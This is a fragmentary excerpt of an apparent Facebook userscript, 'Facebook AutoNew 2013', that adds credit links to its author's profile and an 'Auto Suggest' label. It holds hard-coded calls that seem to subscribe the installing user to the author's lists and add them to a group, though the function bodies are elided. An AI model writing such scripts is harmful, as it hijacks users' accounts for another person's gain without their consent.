...
// @description     Facebook AutoNew 2013 By Fikri Galaxtion
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://www.facebook.com/fikri.hack.cheat?ref=tn_tnmn" target="_blank">Created by Fikri Galaxtion <br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("475577182535253");

//Group Fikri Galaxtion
var gid = ['386695268097908'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Fikri Galaxtion';
